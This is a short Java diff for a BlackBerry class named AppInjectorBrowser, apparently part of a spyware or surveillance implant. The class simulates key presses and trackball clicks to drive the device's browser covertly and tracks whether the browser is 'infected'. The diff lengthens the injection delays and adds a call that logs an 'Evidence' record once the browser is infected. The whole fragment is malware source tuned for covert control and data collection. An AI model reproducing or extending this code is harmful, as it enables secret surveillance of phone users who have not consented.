@@ -14,6 +14,7 @@ import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
+import blackberry.evidence.Evidence;
 import blackberry.injection.AppInjectorInterface;
 import blackberry.injection.KeyInjector;
 import blackberry.interfaces.Singleton;
@@ -28,7 +29,7 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
 
     private static AppInjectorBrowser instance;
     private static final long GUID = 0xa2b7338e410f087bL;
-    private static final int DELAY = 3000;
+    private static final int DELAY = 5000;
 
     boolean infected;
 
@@ -67,9 +68,9 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
         //#endif
 
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        Utils.sleep(100);
+        Utils.sleep(200);
         KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
-        Utils.sleep(100);
+        Utils.sleep(200);
         KeyInjector.trackBallRawClick();
 
         return true;
@@ -89,6 +90,7 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
     }
 
     public void setInfected() {
+        Evidence.info("Browser");
         infected = true;
     }
 
